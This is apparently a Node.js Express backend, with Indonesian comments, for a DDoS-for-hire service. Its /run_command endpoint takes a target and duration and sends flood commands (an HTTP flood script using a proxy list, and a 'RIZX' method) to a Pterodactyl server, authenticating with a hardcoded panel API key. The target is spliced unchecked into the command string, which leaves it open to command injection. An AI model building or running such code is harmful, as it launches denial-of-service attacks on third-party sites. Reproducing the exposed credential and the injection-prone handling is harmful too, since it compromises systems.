const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
app.use(bodyParser.json());

const PTERO_API_KEY = 'ptla_p5dvi3VyNHPVNRwKR6XenOaoHAZHiYnu6Brg1UD5Nbv';
const PANEL_URL = 'https://xvoidmark.modzz.site';
const SERVER_ID = '782feeb1';

app.post('/run_command', async (req, res) => {
  // Menampilkan data yang diterima
  console.log('Data yang diterima:', req.body);

  const { target, duration, method } = req.body;

  // Validasi
  if (!target || !duration || !method) {
    return res.status(400).json({error: 'Semua field harus diisi'});
  }

  let command = '';
  if (method === 'http') {
    command = `node /system/HTTPCOSTUM GET ${target} ${duration} 16 90 proxy.txt`;
  } else if (method === 'rizx') {
    command = `node /system/RIZXCUSTOM ${target} ${duration}`;
  } else {
    return res.status(400).json({error: 'Metode tidak dikenali'});
  }

  try {
    const response = await fetch(`${PANEL_URL}/api/client/servers/${SERVER_ID}/command`, {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${PTERO_API_KEY}`,
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({ command: command })
    });

    const data = await response.json();

    if (!response.ok) {
      return res.status(response.status).json({error: data.errors || data});
    }

    res.json({message: 'Perintah dikirim ke server', data});
  } catch (err) {
    console.error('Error:', err);  // Menampilkan error di console
    res.status(500).json({error: err.message});
  }
});
